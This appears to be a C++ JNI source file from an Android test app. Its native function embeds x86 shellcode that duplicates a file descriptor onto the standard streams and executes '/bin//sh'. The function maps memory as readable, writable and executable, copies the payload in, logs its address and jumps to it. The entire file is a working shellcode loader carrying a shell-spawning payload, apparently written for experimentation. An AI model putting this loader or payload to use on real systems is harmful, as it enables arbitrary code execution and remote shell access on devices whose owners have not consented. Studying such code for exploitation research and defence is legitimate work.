#include "jni.h"
#include <stdio.h>
#include <sys/mman.h>
#include <cstdint>
#include <cstring>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <android/log.h>

extern "C"
JNIEXPORT void JNICALL
Java_com_example_testapp_1android_1studio_MainActivity_nativeFunction(JNIEnv *env, jclass clazz) {
    unsigned char shellcode[] = {
            0x8B, 0x5C, 0x24, 0x38, 0x31, 0xC0, 0xB0, 0x3F, 0x31, 0xC9, 0xB1, 0x02, 0xCD, 0x80, 0x31, 0xC0, 0xB0, 0x3F, 0x49, 0xCD, 0x80, 0x31, 0xC0, 0xB0, 0x3F, 0x49, 0xCD, 0x80, 0x31, 0xC0, 0x50, 0x68, 0x2F, 0x2F, 0x73, 0x68, 0x68, 0x2F, 0x62, 0x69, 0x6E, 0xB0, 0x0B, 0x89, 0xE3, 0x31, 0xC9, 0x31, 0xD2, 0xCD, 0x80
    };
    void *ptr = mmap(0, sizeof(shellcode),  PROT_WRITE | PROT_READ | PROT_EXEC,
                     MAP_ANON | MAP_PRIVATE, -1, 0);
    memcpy(ptr, shellcode, sizeof(shellcode));
//    logcat shellcode address
    __android_log_print(ANDROID_LOG_DEBUG, "MyLib", "shellcode address: %p", ptr);
    ((void(*)())ptr)();
}